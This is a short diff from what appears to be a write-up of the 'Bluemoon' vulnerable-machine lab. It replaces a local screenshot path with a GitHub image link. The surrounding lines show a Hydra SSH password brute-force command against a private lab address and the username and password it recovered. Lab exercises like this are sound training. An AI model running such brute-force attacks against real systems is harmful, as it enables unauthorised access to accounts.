@@ -73,7 +73,7 @@ Files:
 
 hydra -l robin -P p_lists.txt ssh://192.168.56.102
 
-![Hydra](images/hydra.png)
+![Hydra](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/87d4749227ddbd684ab71d42db61d2aa0f43453d/bluemoon%206.png)
 
 Credentials:
 robin : k4rv3ndh4nh4ck3r
